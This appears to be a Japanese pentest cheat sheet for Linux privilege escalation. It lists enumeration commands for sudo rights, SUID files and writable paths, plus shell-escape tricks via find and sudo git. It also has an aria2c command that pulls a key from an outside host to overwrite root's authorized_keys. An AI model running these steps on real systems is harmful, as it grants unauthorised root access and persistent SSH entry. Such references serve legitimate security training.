## 権限エスカレーションの調査

### 今のユーザーで実行可能な`sudo`権限の一覧
```bash
sudo -l
```

### 誰でも書き込み可能なファイルの調査
```bash
find / -perm -o+w -type f 2>/dev/null | grep /proc -v
```

### `setuid`ビットがセットされたファイルの調査
```bash
find / -type f -perm -4000 2>/dev/null
```
- `setuid`ビット: 実行時に所有者の権限で実行されるファイル

### 書き込み可能なディレクトリの調査
```bash
find / -writable -type d 2>/dev/null
```

### 任意のコマンドを用いて調査
```bash
find * -exec bash -p \;
```

### Debianシステムでインストールされているアプリケーション一覧
```bash
dpkg -l
```

### `sudo`を使ったGitの設定ヘルプの表示
```bash
sudo git -p help config
```
- シェルに入るための省略コマンド: `!/bin/sh`

### `aria2c`コマンドを使用したファイルの上書き
```bash
aria2c -d /root/.ssh/ -o authorized_keys "http://192.168.0.99:8000/id_rsa.pub" --allow-overwrite=true
```

### マウントされたドライブの一覧
```bash
cat /etc/fstab
```

### すべての利用可能なドライブの一覧
```bash
lsblk
```

### 読み込まれているドライバの一覧
```bash
lsmod
```

## 参考サイト
- [GTFObins - 各種ファイル等を利用した権限昇格サイト](https://gtfobins.github.io/)
```
